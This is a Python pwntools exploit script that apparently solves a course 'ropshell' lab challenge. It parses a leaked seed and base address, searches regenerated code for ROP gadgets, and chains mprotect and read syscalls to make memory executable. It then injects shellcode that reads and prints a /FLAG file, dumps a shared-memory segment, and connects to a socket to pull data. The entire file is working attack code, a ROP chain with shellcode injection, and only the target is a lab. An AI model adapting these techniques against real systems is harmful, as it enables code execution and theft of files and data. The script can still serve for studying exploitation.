#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
libc = ctypes.CDLL('libc.so.6')


def gadget(cmd):
    cmd += ';ret;'
    asmcmd = asm(cmd)
    offset = code.find(asmcmd)
    if offset == -1:
        print("Not Found!")
    return p64(start_addr + offset)

def lab7_exit(status):
    cmd = b''
    cmd += gadget(cmd='pop rax')
    cmd += p64(60)
    cmd += gadget(cmd='pop rdi')
    cmd += p64(status)
    cmd += gadget(cmd='syscall')
    return cmd

def lab7_mprotect(start, len, mode):
    cmd = b''
    cmd += gadget(cmd='pop rax')
    cmd += p64(10)
    cmd += gadget(cmd='pop rdi')
    cmd += p64(start)
    cmd += gadget(cmd='pop rsi')
    cmd += p64(len)
    cmd += gadget(cmd='pop rdx')
    cmd += p64(mode)
    cmd += gadget(cmd='syscall')
    return cmd

def lab7_read(fd, buf, len):
    cmd = b''
    cmd += gadget(cmd='pop rax')
    cmd += p64(0)
    cmd += gadget(cmd='pop rdi')
    cmd += p64(fd)
    cmd += gadget(cmd='pop rsi')
    cmd += p64(buf)
    cmd += gadget(cmd='pop rdx')
    cmd += p64(len)
    cmd += gadget(cmd='syscall')
    return cmd

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)
r.recvuntil(b'Timestamp is ')
seed = int(r.recvline().decode())
print('Seed: {}'.format(seed))
r.recvuntil(b'Random bytes generated at ')
start_addr = int(r.recvline().decode(), 16)
print('Start addr: {}'.format(hex(start_addr)))

code = subprocess.check_output(['./code_gen', str(seed)])
print('LEN_CODE: {}'.format(len(code)))
command = list()
command.append(lab7_exit(37))
flag = "/FLAG\0".encode()
part2_code = asm('''
// open FLAG
mov rax, 2
pop rdi
mov rsi, 0
mov rdx, 7
syscall
// read
mov rdi, rax
mov rax, 0
pop rsi
pop rdx
syscall
// write
mov rdx, rax
mov rax, 1
mov rdi, 1
pop rsi
syscall
// exit 0
mov rdi, 0
mov rax, 60
syscall
ret
''')
command.append(lab7_mprotect(start=start_addr, len=len(code), mode=7) 
               + lab7_read(0, start_addr, len(flag) + len(part2_code)) 
               + p64(start_addr + len(flag)) 
               + p64(start_addr)
               + p64(start_addr + len(flag) + len(part2_code) + 100)
               + p64(100)
               + p64(start_addr + len(flag) + len(part2_code) + 100))
part3_code = asm('''
// shmget
mov rax, 29
pop rdi
pop rsi
mov rdx, 0
syscall
// shmat
mov rdi, rax
mov rax, 30
mov rsi, 0
mov rdx, 4096
syscall
// write
mov rsi, rax
mov rax, 1
mov rdi, 1
mov rdx, 69
syscall
// exit 0
mov rdi, 0
mov rax, 60
syscall
ret
''')
command.append(lab7_mprotect(start=start_addr, len=len(code), mode=7) 
               + lab7_read(0, start_addr, len(part3_code)) 
               + p64(start_addr) 
               + p64(0x1337)
               + p64(1024))
addr = subprocess.check_output(['./addr', str(seed)])
part4_code = asm('''
// socket
mov rax, 41
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall
// connect
mov rdi, rax
mov rax, 42
pop rsi
pop rdx
syscall
// read
mov rdi, 3
mov rax, 0
pop rsi
pop rdx
syscall
// write
mov rdx, rax
mov rax, 1
mov rdi, 1
pop rsi
syscall
// exit 0
mov rdi, 0
mov rax, 60
syscall
ret
''')
command.append(lab7_mprotect(start=start_addr, len=len(code), mode=7) 
               + lab7_read(0, start_addr, len(addr) + len(part4_code)) 
               + p64(start_addr + len(addr))
               + p64(start_addr)
               + p64(len(addr))
               + p64(start_addr + len(addr) + len(part4_code) + 100)
               + p64(100)
               + p64(start_addr + len(addr) + len(part4_code) + 100)
               )
i = 0
while True:
    tmp = r.recvuntil(b'shell> ').decode()
    print(tmp)
    if i >= len(command):
        break
    r.send(command[i])
    if i == 1:
        print('part2')
        r.send(flag + part2_code)
    elif i == 2:
        print('part3')
        r.send(part3_code)
    elif i == 3:
        print('part4')
        r.send(addr + part4_code)
    i += 1

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
